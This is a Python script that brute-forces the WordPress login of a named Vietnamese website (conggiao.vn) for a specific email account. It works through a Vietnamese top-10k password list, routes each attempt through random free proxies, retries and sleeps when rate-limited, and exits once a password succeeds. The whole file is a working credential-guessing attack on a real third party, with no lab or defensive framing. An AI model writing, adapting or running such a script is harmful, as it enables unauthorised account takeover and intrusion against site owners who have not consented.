# https://conggiao.vn/wp-login.php
# conggiaov@gmail.com
import time
import multiprocessing
import requests
import sys

from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
from fp.fp import FreeProxy

def get_user_agent():
    software_names = [SoftwareName.CHROME.value]
    operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]   
    user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)
    return user_agent_rotator.get_random_user_agent()

def attack(site, username, password):
    cookie = {'wordpress_test_cookie': 'WP+Cookie+check'}
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Đăng+Nhập',
        'testcookie': '1'
    }
    proxy = FreeProxy(rand=True, https=True).get()
    # print(xx)
    for i in range(3):
        try:
            r = requests.post(site, data=data, cookies=cookie, proxies={
                "https": proxy
            }, headers={
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
            }, verify=False)
            if 'wp-admin' in r.url:
                return True
            print(r.status_code, r.url, proxy)
            if r.status_code == 429:
                raise Exception('too many')
        except Exception:
            time.sleep(10)
    return False

def get_passwords():
    with open('C:\\projects\\passwords\\vietnam-password-lists-master\\top10k-vn-passwords.txt', encoding='utf-8') as fobj:
        for line in fobj:
            yield line.strip()

def attach_cgvn(password):
    if attack("https://conggiao.vn/wp-login.php", "conggiaov@gmail.com", password):
        print("Found password %s" % password)
        sys.exit()
    else:
        print('.', end='')


if __name__ == '__main__':
    # with multiprocessing.Pool(10) as pool:
    #     pool.map(attach_cgvn, get_passwords())
    from proxychecker import Checker
    checker = Checker()

    #Check the proxies in the file "proxies.txt"
    proxies = checker.check(r'C:\projects\HappyTeacher\http.txt')
    print(proxies)